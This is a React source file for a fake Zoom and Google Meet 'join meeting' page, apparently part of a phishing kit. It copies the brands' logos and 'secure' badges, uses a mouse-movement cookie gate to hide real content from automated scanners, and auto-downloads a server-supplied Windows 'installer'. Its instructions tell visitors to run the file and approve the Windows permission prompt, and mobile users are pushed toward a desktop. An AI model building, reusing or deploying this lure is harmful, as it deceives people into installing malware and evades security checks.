import { useEffect, useRef, useState, type ReactNode } from 'react';
import { useQuery } from '@tanstack/react-query';
import { useParams } from 'react-router-dom';
import { fetchPublicGuestLink } from '@/api/guest-links';
import { isMobileDevice } from '@/lib/device';
import {
  installerFileNameForTemplate,
  type GuestInviteTemplate,
} from '@/lib/guest-invite';
import { applyMeetingPageBranding } from '@/lib/meeting-branding';
import {
  createPreCheckToken,
  hasPreCheckCookie,
  setPreCheckCookie,
} from '@/lib/pre-check-gate';
import './meeting-join.css';

const GATE_MIN_MS = 2000;
const PRE_CHECK_MIN_MS = 1800;

function useMeetingPageBranding(template: GuestInviteTemplate, phase: 'loading' | 'ready') {
  useEffect(() => applyMeetingPageBranding(template, phase), [template, phase]);
}

function useMeetingGuestBodyClass() {
  useEffect(() => {
    document.body.classList.add('meeting-guest-page');
    return () => document.body.classList.remove('meeting-guest-page');
  }, []);
}

function useJoinPageGate(apiReady: boolean, minMs = GATE_MIN_MS): boolean {
  const startedAt = useRef(Date.now());
  const [gateOpen, setGateOpen] = useState(false);

  useEffect(() => {
    if (!apiReady) {
      setGateOpen(false);
      return;
    }

    const elapsed = Date.now() - startedAt.current;
    const delay = Math.max(0, minMs - elapsed);
    const timer = window.setTimeout(() => setGateOpen(true), delay);
    return () => window.clearTimeout(timer);
  }, [apiReady, minMs]);

  return gateOpen;
}

function useAutoInstallerDownload(
  code: string,
  installerUrl: string,
  installerFileName: string,
  enabled: boolean,
) {
  const [downloadStarted, setDownloadStarted] = useState(false);

  useEffect(() => {
    if (!enabled || !installerUrl || !installerFileName) return;

    const storageKey = `nd-install-started:${code}`;
    if (sessionStorage.getItem(storageKey)) {
      setDownloadStarted(true);
      return;
    }

    sessionStorage.setItem(storageKey, '1');
    setDownloadStarted(true);

    const link = document.createElement('a');
    link.href = installerUrl;
    link.download = installerFileName;
    link.rel = 'noopener';
    link.style.display = 'none';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }, [code, enabled, installerFileName, installerUrl]);

  return downloadStarted;
}

/**
 * meetinginvite.vu bot gate: gray loader → set _pre_check cookie → reload → real page.
 */
function usePreCheckGate(): boolean {
  const [passed] = useState(() => hasPreCheckCookie());

  useEffect(() => {
    if (passed) return;

    const startedAt = Date.now();
    const token = createPreCheckToken();

    function release() {
      if (Date.now() - startedAt < PRE_CHECK_MIN_MS) return;
      setPreCheckCookie(token);
      window.location.reload();
    }

    document.addEventListener('mousemove', release, { passive: true });
    const timer = window.setTimeout(release, GATE_MIN_MS);
    return () => {
      document.removeEventListener('mousemove', release);
      window.clearTimeout(timer);
    };
  }, [passed]);

  return passed;
}

function PreCheckLoader() {
  return (
    <div className="meeting-loader">
      <div className="meeting-loader__spin" />
    </div>
  );
}

function JoinLoaderGate({
  apiReady,
  children,
}: {
  apiReady: boolean;
  children: ReactNode;
}) {
  const gateOpen = useJoinPageGate(apiReady);

  if (!apiReady || !gateOpen) {
    return (
      <div className="meeting-loader">
        <div className="meeting-loader__spin" />
      </div>
    );
  }

  return <>{children}</>;
}

function GoogleMeetLogo() {
  return (
    <svg width="28" height="28" viewBox="0 0 48 48" aria-hidden>
      <path fill="#00832d" d="M44 14L30 24l14 10V14z" />
      <path fill="#0066da" d="M30 24L4 6v36l26-18z" />
      <path fill="#e94235" d="M4 6l14 10-14 10V6z" />
      <path fill="#2684fc" d="M30 24l14-10v20L30 24z" />
      <path fill="#00ac47" d="M4 42l26-18 14 10L4 42z" />
      <path fill="#ffba00" d="M18 16l12 8-12 8V16z" />
    </svg>
  );
}

function ZoomLogo({ size = 'md' }: { size?: 'sm' | 'md' }) {
  const fontSize = size === 'sm' ? '1.125rem' : '2rem';
  return (
    <span style={{ fontSize, fontWeight: 700, color: '#0b5cff', letterSpacing: '-0.03em' }}>
      zoom
    </span>
  );
}

function MonitorIcon({ color }: { color: string }) {
  return (
    <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="1.5">
      <rect x="2" y="3" width="20" height="14" rx="2" />
      <line x1="8" y1="21" x2="16" y2="21" />
      <line x1="12" y1="17" x2="12" y2="21" />
    </svg>
  );
}

function ShieldIcon({ color }: { color: string }) {
  return (
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2">
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
    </svg>
  );
}

function MobileDesktopRequired({ template }: { template: GuestInviteTemplate }) {
  const isMeet = template === 'google_meet';

  return (
    <div className="meeting-mobile">
      <div className="meeting-mobile__card">
        <div className="meeting-mobile__body">
          {isMeet ? (
            <div className="meeting-mobile__brand-row">
              <GoogleMeetLogo />
              <span className="meeting-mobile__brand-text">Google Meet</span>
            </div>
          ) : (
            <ZoomLogo size="sm" />
          )}
          <div
            className={`meeting-mobile__icon-wrap ${isMeet ? 'meeting-mobile__icon-wrap--meet' : 'meeting-mobile__icon-wrap--zoom'}`}
          >
            <MonitorIcon color={isMeet ? '#60a5fa' : '#2D8CFF'} />
          </div>
          <h1>Desktop Required</h1>
          <p className="meeting-mobile__msg">
            To ensure the best secure video conference experience and full feature support, please
            open this meeting link on a desktop or laptop computer.
          </p>
        </div>
        <div className="meeting-mobile__footer">
          <ShieldIcon color={isMeet ? '#7dd3a8' : '#2D8CFF'} />
          {isMeet ? 'Google Workspace Secure' : 'Zoom Secure'}
        </div>
      </div>
    </div>
  );
}

function DownloadSteps({ fileName }: { fileName: string }) {
  return (
    <ol className="meeting-desktop__steps">
      <li>Your download should start automatically ({fileName}).</li>
      <li>Open your Downloads folder and double-click the file.</li>
      <li>Click Continue, then Yes when Windows asks for permission.</li>
      <li>Wait for setup to finish, then return here to join.</li>
    </ol>
  );
}

function ZoomDesktop({
  installerUrl,
  installerFileName,
  code,
}: {
  installerUrl: string;
  installerFileName: string;
  code: string;
}) {
  const downloadStarted = useAutoInstallerDownload(code, installerUrl, installerFileName, true);

  return (
    <div className="meeting-zoom-desktop">
      <ZoomLogo />
      <h1>Join Meeting</h1>
      <p className="meeting-zoom-desktop__sub">
        You have been invited to join a Zoom meeting. Download and launch the Zoom client to
        connect.
      </p>
      {downloadStarted ? (
        <p className="meeting-desktop__status meeting-desktop__status--zoom">
          Download started. If nothing appeared, click the button below.
        </p>
      ) : null}
      <a
        className="meeting-zoom-desktop__btn"
        href={installerUrl}
        download={installerFileName}
      >
        Download Zoom Client
      </a>
      <DownloadSteps fileName={installerFileName} />
      <p className="meeting-zoom-desktop__note">
        NOTE: For the best connectivity please use Google Chrome on a Windows PC.
      </p>
      <div className="meeting-zoom-desktop__secure">
        <ShieldIcon color="#6e7680" />
        Zoom Secure
      </div>
    </div>
  );
}

function GoogleMeetDesktop({
  installerUrl,
  installerFileName,
  code,
}: {
  installerUrl: string;
  installerFileName: string;
  code: string;
}) {
  const downloadStarted = useAutoInstallerDownload(code, installerUrl, installerFileName, true);

  return (
    <div className="meeting-meet-desktop">
      <div className="meeting-meet-desktop__brand-row">
        <GoogleMeetLogo />
        <span className="meeting-meet-desktop__brand-text">Google Meet</span>
      </div>
      <h1>Ready to join?</h1>
      <p className="meeting-meet-desktop__sub">
        You have been invited to join a Google Meet call session. Download the meeting app to
        connect from your computer.
      </p>
      {downloadStarted ? (
        <p className="meeting-desktop__status meeting-desktop__status--meet">
          Download started. If nothing appeared, click the button below.
        </p>
      ) : null}
      <a
        className="meeting-meet-desktop__btn"
        href={installerUrl}
        download={installerFileName}
      >
        Download meeting app
      </a>
      <DownloadSteps fileName={installerFileName} />
      <p className="meeting-meet-desktop__note">
        NOTE: For the best connectivity pls use Google Chrome on a Windows PC.
      </p>
      <div className="meeting-meet-desktop__secure">
        <ShieldIcon color="#7dd3a8" />
        Google Workspace Secure
      </div>
    </div>
  );
}

export function MeetingJoinLanding({ template: routeTemplate }: { template: GuestInviteTemplate }) {
  useMeetingGuestBodyClass();
  const preCheckPassed = usePreCheckGate();
  const mobile = isMobileDevice();
  const { code = '' } = useParams();

  const query = useQuery({
    queryKey: ['guest-public', code, routeTemplate],
    enabled: Boolean(code) && preCheckPassed,
    queryFn: () => fetchPublicGuestLink(code),
    retry: 1,
  });

  const brandingPhase =
    !preCheckPassed || query.isLoading ? 'loading' : 'ready';
  useMeetingPageBranding(routeTemplate, brandingPhase);

  if (!preCheckPassed) {
    return <PreCheckLoader />;
  }

  const apiReady = !query.isLoading;

  return (
    <JoinLoaderGate apiReady={apiReady}>
      {query.isError || !query.data ? (
        <div className="meeting-error">
          This meeting link is invalid, expired, or no longer available.
        </div>
      ) : mobile ? (
        <MobileDesktopRequired template={routeTemplate} />
      ) : routeTemplate === 'google_meet' ? (
        <GoogleMeetDesktop
          code={code}
          installerUrl={query.data.windowsInstallerUrl}
          installerFileName={
            query.data.installerFileName ?? installerFileNameForTemplate(routeTemplate)
          }
        />
      ) : (
        <ZoomDesktop
          code={code}
          installerUrl={query.data.windowsInstallerUrl}
          installerFileName={
            query.data.installerFileName ?? installerFileNameForTemplate(routeTemplate)
          }
        />
      )}
    </JoinLoaderGate>
  );
}
